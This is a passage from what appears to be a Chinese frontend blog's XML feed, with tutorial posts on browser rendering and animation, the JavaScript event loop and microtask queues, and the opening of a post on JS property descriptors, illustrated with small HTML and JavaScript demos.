class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>浏览器渲染原理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ball</span> {</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#ball1</span> {</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: blue;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation</span>: move1 <span class="number">1s</span> alternate infinite ease-in-out;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#ball2</span> {</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation</span>: move2 <span class="number">1s</span> alternate infinite ease-in-out;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="keyword">@keyframes</span> move1 {</span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">to</span> {</span></span><br><span class="line"><span class="language-css">                <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">200px</span>);</span></span><br><span class="line"><span class="language-css">            }</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="keyword">@keyframes</span> move2 {</span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">to</span> {</span></span><br><span class="line"><span class="language-css">                <span class="attribute">left</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            }</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span>点我死循环3s<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ball1"</span> <span class="attr">class</span>=<span class="string">"ball"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ball2"</span> <span class="attr">class</span>=<span class="string">"ball"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">'#btn'</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title function_">delay</span> = (<span class="params">ms</span>) =&gt; {</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> start = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">while</span> (<span class="title class_">Date</span>.<span class="title function_">now</span>() - start &lt; ms) {</span></span><br><span class="line"><span class="language-javascript">    }</span></span><br><span class="line"><span class="language-javascript">  };</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 点击触发死循环，阻塞渲染</span></span></span><br><span class="line"><span class="language-javascript">  btn.<span class="property">onclick</span> = <span class="function">() =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">delay</span>(<span class="number">3000</span>); <span class="comment">// 阻塞 3 秒</span></span></span><br><span class="line"><span class="language-javascript">  };</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><code>ball1</code> 使用 <code>transform</code>，而 <code>ball2</code> 通过更改 <code>left</code> 布局信息做动画。</p><p>值得一提的是，滚动条的滚动也是只发生在 draw 阶段的，所以当页面阻塞时，页面还是可以正常滚动。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器渲染原理 </tag>
            
            <tag> reflow </tag>
            
            <tag> repaint </tag>
            
            <tag> 前端优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>事件循环</title>
      <link href="/posts/13214.html"/>
      <url>/posts/13214.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="浏览器的进程模型"><a class="markdownIt-Anchor" href="#浏览器的进程模型"></a> 浏览器的进程模型</h2><h3 id="什么是进程"><a class="markdownIt-Anchor" href="#什么是进程"></a> 什么是进程</h3><p>程序运行需要拥有它自己的一块内存空间，可以简单的将这块内存空间理解为进程。</p><p>每个应用至少有一个进程，进程与进程之间相互独立，不同的进程之间需要通信，双方都必须同意。</p><h3 id="什么是线程"><a class="markdownIt-Anchor" href="#什么是线程"></a> 什么是线程</h3><p>有了进程，就可以运行程序的代码了。</p><p>运行代码的<strong>人</strong>就成为线程。一个进程至少有一个线程，所有进程在开启之后会自动的创建一个线程来运行代码，该线程称之为<strong>主线程</strong>。如果程序需要同时执行多块代码，主线程就会启动更多的线程来执行代码，即一个进程可以包含多个线程。</p><p>如果把进程理解为老板，那么线程就是这个老板所管的一个个车间。老板需求小能力小，那么车间可能就一个，能力大需求大，那么可能就会存在多个车间。</p><h3 id="浏览器"><a class="markdownIt-Anchor" href="#浏览器"></a> 浏览器</h3><p><strong>浏览器是一个多进程多线程的应用程序。</strong></p><p>像浏览器这种内部工作极其复杂的程序，为了减少一个崩溃引发连环崩溃的几率，浏览器会启动多个进程。比如浏览器进程、网络进程、渲染进程等等。</p><div class="note info flat"><p>可以在浏览器的任务管理器中查看当前的所有进程</p></div><p>其中，最主要的进程有：</p><ol><li>浏览器进程<br>主要负责界面显示、用户交互、子进程管理等。浏览器进程内部会启动多个线程处理不同的任务。</li><li>网络进程<br>负责加载网络资源。网络进程内部会启动多个线程来处理不同的网络任务。</li><li><strong>渲染进程</strong><br>渲染进程启动后，会开启一个渲染主线程。这个主线程负责执行 <code>HTML</code>、<code>CSS</code>、<code>JS</code> 代码。<br>默认情况下，浏览器会为每个标签页开启一个新的渲染进程，以保证不同的标签页之间不会互相影响。<s>这也是常说 Chrome 浏览器吃内存的原因了</s></li></ol><div class="note info flat"><p>该默认模式可能会随着技术发展、用户体验而有所更改，可参见 <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/process_model_and_site_isolation.md#Modes-and-Availability">chrome 官方说明文档</a></p></div><h2 id="渲染主线程"><a class="markdownIt-Anchor" href="#渲染主线程"></a> 渲染主线程</h2><p>渲染主线程是浏览器中最为繁忙的线程，需要它处理的任务包括但不限于：</p><ul><li>解析 HTML</li><li> 解析 CSS</li><li> 计算样式</li><li>布局</li><li>处理图层</li><li>每秒把页面画 60 次</li><li>执行全局 JS 代码</li><li>执行事件处理函数</li><li>执行计时器的回调函数</li><li>……</li></ul><div class="note primary flat"><p>为什么渲染进程不使用多个线程来处理这些事情？</p></div><p>要处理这么多的任务，就必须设计一个精妙的调度处理方案：<strong>排队</strong>。</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509021541059.png" alt="事件循环-排队"></p><ol><li>在最开始的时候，渲染主线程会进入一个无限循环。</li><li>每一次循环会检查消息队列中是否有任务存在。如果有，就取出第一个任务执行，执行完之后进入下一次循环；如果没有，则进入休眠状态。</li><li>其他所有线程（包括其他进程的线程）可以随时向消息队列添加任务。新任务会加到消息队列的末尾。在添加新任务时，如果主线程是休眠状态，则会将其唤醒以继续循环拿取任务。</li></ol><p>这样一来，每个任务都可以被可持续的、有条不紊的执行下去了。</p><mark class="hl-label orange">这整个过程，被称为事件循环（消息循环）</mark> <div class="note info flat"><p><code>W3C </code>官网将这一过程称为 <code>event loop</code>，而谷歌浏览器的具体源代码实现方案中将其称为 <code>message loop</code>。两者其实是一个东西，只是命名不同。</p></div><h2 id="思考"><a class="markdownIt-Anchor" href="#思考"></a> 思考</h2><p>在知道了上述过程的工作流程原理之后，我们就能解释许多现象或者名词了。</p><h3 id="异步"><a class="markdownIt-Anchor" href="#异步"></a> 异步</h3><p>代码在执行过程中，会遇到一些无法立即处理的任务。比如：</p><ul><li>计时完成之后执行某个任务：<code>setTimeout</code>、<code>setInterval</code></li><li>网络通信完成之后执行某个任务：<code>XHR</code>、<code>Fetch</code></li><li>用户操作之后需要执行某个任务：<code>addEventListener</code></li><li>……</li></ul><p>如果让渲染主线程等待这些任务的时机到达，就会使得主线程长期处于 "阻塞" 的状态，进而导致浏览器出现 "卡死" 现象。同步代码执行导致阻塞示例如下：</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509021627242.png" alt="事件循环-同步"></p><p>同步地执行代码虽然能使得代码执行的时间线同步，但是带来的坏处实在太过巨大，完全不能瑕不掩瑜。</p><mark class="hl-label orange">所以，渲染主线程承担着极其重要的工作，无论如何都不能阻塞。</mark> <p>因此，浏览器选择异步来解决该问题：</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509021638179.png" alt="事件循环-异步"></p><p>使用异步的方式，渲染主线程永不堵塞。</p><div class="note info flat"><p>面试题：如何理解 JS 的异步？</p><p>JS 是一门单线程的语言，这是因为它运行在浏览器的渲染主线程中，而渲染主线程只有一个。<br>渲染主线程承担着诸多任务，渲染页面、执行 JS 等等，这些任务都在其中运行。<br>如果使用同步的方式，就极有可能导致主线程堵塞，从而导致消息队列中的其他任务无法得到执行。<br>这样一来，主线程被堵塞白白浪费时间，页面无法及时更新，用户看到页面卡死现象，造成不好的体验。</p><p>所以浏览器采用异步的方式来避免。具体来说，当某些任务发生时，比如计时器、网络、事件监听等，主线程会将任务交给其他线程去处理，自身立即结束当前任务的执行，转而执行后续任务。当其他线程完成时，会将事先传递的回调函数包装成任务，加入到消息队列的末尾进行排队，等待主线程调度执行。</p><p>在这种异步模式下，浏览器永不阻塞，最大限度的保证了单线程的流畅运行。</p></div><h3 id="js为什么会阻碍渲染"><a class="markdownIt-Anchor" href="#js为什么会阻碍渲染"></a> JS 为什么会阻碍渲染</h3><p>假设有以下的代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>事件循环<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>事件循环<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span>点我改变文字<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> h1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">'h1'</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">'#btn'</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title function_">delay</span> = (<span class="params">ms</span>) =&gt; {</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> start = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">while</span> (<span class="title class_">Date</span>.<span class="title function_">now</span>() - start &lt; ms) {</span></span><br><span class="line"><span class="language-javascript">    }</span></span><br><span class="line"><span class="language-javascript">  }</span></span><br><span class="line"><span class="language-javascript">  btn.<span class="property">onclick</span> = <span class="function">() =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">    h1.<span class="property">textContent</span> = <span class="string">'Hello, World!'</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">delay</span>(<span class="number">3000</span>);</span></span><br><span class="line"><span class="language-javascript">  }</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>思考思考，已知更改 <code>h1</code> 的内容代码在调用 <code>delay()</code> 函数的前面，那么点击了页面的按钮会发生什么事？</p><details class="folding-tag"><summary> 查看参考答案 </summary>              <div class="content">              <p>在点击按钮之后，页面会卡死 3s 左右，然后<code>事件循环</code>才变成 <code>Hello, World!</code>。</p><p>具体来说，最开始渲染主线程在执行全局 JS（当然也会有其他任务，但相对于目前的简单环境来说，你可以认为那些任务被执行的极快，可忽略它们的影响，我们只关注 JS），从 <code>const h1</code> 执行到 <code>btn.onClick</code> 发现一个点击事件，于是告知交互线程需要对按钮进行监听，到此渲染主线程将全局 JS 执行完毕。</p><p>全局 JS 被执行完毕之后，渲染主线程因为没有其他任务进入休眠状态。直到用户点击了按钮，此时交互线程监听到按钮被点击，于是将回调函数包装成任务放到消息队列，渲染主线程因此被唤醒开始执行回调。</p><p>回调函数中，首先被执行的是 <code>h1.textContent = 'Hello, World!'</code>，对 dom 的文本进行了设置，然后产生渲染任务放入消息队列，结束当前代码行执行下一行 <code>delay(3000)</code>。也就是说，文本 dom 确实被正确设置了，但是用户肉眼是看不到的，必须等浏览器将内容绘制出来，而这个等待的时间就是 <code>delay()</code> 阻塞的时间加上绘制任务被拿取到渲染主线程进行执行的时间。</p><p>上述 <code>delay</code>+ <code>任务拿取时间</code>的总和是大于我们设定的 <code>3000ms</code> 的，这也是计时器不精准的一部分原因。</p>              </div>            </details><h3 id="任务存在优先级吗"><a class="markdownIt-Anchor" href="#任务存在优先级吗"></a> 任务存在优先级吗</h3><p>任务没有优先级，在消息队列中先进先出，但是<strong>消息队列存在优先级</strong>。</p><p>根据 W3C 的解释：</p><ul><li>每个任务都有一个任务类型，同一个类型的任务必须在一个队列，不同类型的任务可以分属不同的队列。在一次事件循环中，浏览器可以根据实际情况从不同的队列中取出任务执行。</li><li>浏览器必须准备好一个微队列，微队列中的任务优先于其他所有任务执行。</li></ul><p>参考文档：<a href="https://html.spec.whatwg.org/multipage/webappapis.html#perform-a-microtask-checkpoint">https://html.spec.whatwg.org/multipage/webappapis.html#perform-a-microtask-checkpoint</a></p><p>关键句：While the <a href="https://html.spec.whatwg.org/multipage/webappapis.html#event-loop">event loop</a>'s <a href="https://html.spec.whatwg.org/multipage/webappapis.html#microtask-queue">microtask queue</a> is not <a href="https://infra.spec.whatwg.org/#list-is-empty">empty</a></p><div class="note warning flat"><p>随着浏览器的复杂度急剧提升，W3C 不再使用宏队列的说法</p></div><p>在目前的 chrome 的实现中，至少包含了下面的队列：</p><ul><li>延时队列：用于存放计时器到达后的回调任务，优先级：中</li><li>交互队列：用于存放用户操作后产生的事件处理任务，优先级：高</li><li>微队列：存放需要最快执行的任务，优先级：最高</li></ul><p>添加任务到微队列的主要方式是使用 <code>Promise</code>、<code>MutationObserver</code>，例如：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(fn)</span><br></pre></td></tr></tbody></table></figure><p>当然，浏览器还存在其他很多队列，由于和我们开发关系不大，不在此介绍了。</p><h3 id="小栗子"><a class="markdownIt-Anchor" href="#小栗子"></a> 小栗子</h3><p>假设有以下代码：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br><span class="line">  })</span><br><span class="line">}</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>)</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(a)</span><br><span class="line">}, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span>)</span><br><span class="line">})</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>)</span><br></pre></td></tr></tbody></table></figure><p>思考，上述代码输出结果是什么？</p><details class="folding-tag"><summary> 查看参考答案 </summary>              <div class="content">              <p>上述代码将输出：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">4</span><br><span class="line">3</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></tbody></table></figure><p>简单来说执行先后为：</p><ol><li>执行全局 JS</li><li>0s 到了，将计时交给计时线程，产生任务放入延时队列</li><li>将 <code>log(4)</code> 任务放入微队列</li><li>执行 <code>log(5)</code> 任务，全局 JS 任务完毕</li><li>执行微队列任务 <code>log(4)</code></li><li>延时队列任务被执行，先执行 <code>log(3)</code>，再将 <code>fn a</code> 放入微队列</li><li>微队列任务被执行，先执行 <code>log(1)</code>，然后又将 <code>log(2)</code> 放入微队列</li><li><code>log(2)</code> 被执行</li></ol>              </div>            </details> <h2 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h2><h3 id="阐述js事件循环"><a class="markdownIt-Anchor" href="#阐述js事件循环"></a> 阐述 JS 事件循环？</h3><p>事件循环又叫做消息循环，是浏览器渲染主线程的工作方式。<br>在 Chrome 的源码中，它开启一个不会结束的 for 循环，每次循环从消息队列中取出第一个任务执行，而其<br>他线程只需要在合适的时候将任务加入到队列末尾即可。<br>过去把消息队列简单分为宏队列和微队列，这种说法目前已无法满足复杂的浏览器环境，取而代之的是一种更加灵活多变的处理方式。<br>根据 W3C 官方的解释，每个任务有不同的类型，同类型的任务必须在同一个队列，不同的任务可以属于不同的队列。不同任务队列有不同的优先级，在一次事件循环中，由浏览器自行决定取哪一个队列的任务。但浏览器必须有一个微队列，微队列的任务一定具有最高的优先级，必须优先调度执行。</p><h3 id="js中的计时器为什么做不到精确计时"><a class="markdownIt-Anchor" href="#js中的计时器为什么做不到精确计时"></a> JS 中的计时器为什么做不到精确计时？</h3><ol><li>计算机硬件没有原子钟，无法做到精确计时。</li><li>操作系统的计时函数本身就有少量偏差，由于 JS 的计时器最终调用的是操作系统的函数，也就携带了这些偏差。</li><li>按照 W3C 的标准，例如 Chrome 浏览器实现计时器时，如果嵌套层级超过 5 层，则会带有 4 毫秒的最少时间，这样在计时时间少于 4 毫秒时又带来了偏差。</li><li>受事件循环的影响，计时器的回调函数只能在主线程空闲时运行，因此又带来了偏差。</li></ol><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 事件循环 </tag>
            
            <tag> 异步 </tag>
            
            <tag> JS计时器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS 属性描述符</title>
      <link href="/posts/1.html"/>
      <url>/posts/1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="场景引入"><a class="markdownIt-Anchor" href="#场景引入"></a> 场景引入</h2><p>当前有一个对象，你需要对该对象进行封装。举例来说，对象可以是简单的商品对象数据：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> goods = {</span><br><span class="line">  <span class="attr">pic</span>: <span class="string">'/img/1.webp'</span>,</span><br><span class="line">  <span class="attr">title</span>: <span class="string">'simple title'</span>,</span><br><span class="line">  <span class="attr">desc</span>: <span class="string">'simple desc'</span>,</span><br><span class="line">  <span class="attr">sellNumber</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">favorRate</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">price</span>: <span class="number">20</span>,</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>自然的，你为了更方便的实现业务，会为它加上一些缺失的属性，比如选择的商品数量和总价，但是为了不更改原始对象数据 <code>goods</code>，所以你使用 <code>class</code> 来进行封装：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原始对象数据</span></span><br><span class="line"><span class="keyword">const</span> goods = {</span><br><span class="line">  <span class="attr">pic</span>: <span class="string">'/img/1.webp'</span>,</span><br><span class="line">  <span class="attr">title</span>: <span class="string">'simple title'</span>,</span><br><span class="line">  <span class="attr">desc</span>: <span class="string">'simple desc'</span>,</span><br><span class="line">  <span class="attr">sellNumber</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">favorRate</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">price</span>: <span class="number">20</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span> {</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">goods</span>) {</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">data</span> = goods;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chooseNum</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">totalPrice</span> = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> g = <span class="keyword">new</span> <span class="title class_">Goods</span>(goods);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g);</span><br></pre></td></tr></tbody></table></figure><p>然后，你意识到 <code>totalPrice</code> 可以由 <code>data</code> 和 <code>chooseNum</code> 算出来，所以你为了避免将来因为忘记有这回事，更新了选中商品数量却忘记更新总价数据，导致数据不一致的问题出现，选择去除这个会造成数据冗余的属性 <code>totalPrice</code>，而是将它改为函数：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span> {</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">goods</span>) {</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">data</span> = goods;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chooseNum</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// this.totalPrice = 0;</span></span><br><span class="line">  }</span><br><span class="line">  <span class="title function_">getTotalPrice</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">chooseNum</span> * <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">price</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> g = <span class="keyword">new</span> <span class="title class_">Goods</span>(goods);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">getTotalPrice</span>());</span><br></pre></td></tr></tbody></table></figure><p>终于，现在封装的像样子了…… 吗？</p><p>发散地想，随着业务进行，代码量越来越多，甚至要和其他人一起协作完成。此时，有人使用到了这个 <code>g</code>，并且在不注意的情况下，直接更改了 <code>g</code> 的 <code>data</code> 属性呢？比如：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span> {</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">goods</span>) {</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">data</span> = goods;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chooseNum</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// this.totalPrice = 0;</span></span><br><span class="line">  }</span><br><span class="line">  <span class="title function_">getTotalPrice</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">chooseNum</span> * <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">price</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> g = <span class="keyword">new</span> <span class="title class_">Goods</span>(goods);</span><br><span class="line">g.<span class="property">data</span> = <span class="string">'AAA建材招租'</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">getTotalPrice</span>());</span><br></pre></td></tr></tbody></table></figure><p>此时，调用的 <code>g.getTotalPrice()</code> 运行出错，再也得不到正确的结果，一个方法如此，如果有多个依靠 <code>data</code> 的方法，那情况更灾难了。我这里举的例子比较夸张，知道意思即可。</p><p>实际上，我们希望的效果肯定是<strong>原始数据不能改动</strong>，因为很多东西都是在这个数据的基础上建立起来的。</p><h2 id="属性描述符"><a class="markdownIt-Anchor" href="#属性描述符"></a> 属性描述符</h2><p>上述情况其实就是写库、写框架的人时刻在考虑的事：时刻考虑各种可能发生的 "神奇操作"，并在代码上杜绝错误或不期望的操作生效，使得最终效果为期望效果。那么，属性描述符能一定程度上解决这种问题。</p><h3 id="什么是属性描述符"><a class="markdownIt-Anchor" href="#什么是属性描述符"></a> 什么是属性描述符</h3><p>假设有这样一个简单对象：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = {</span><br><span class="line">  <span class="attr">a</span>: 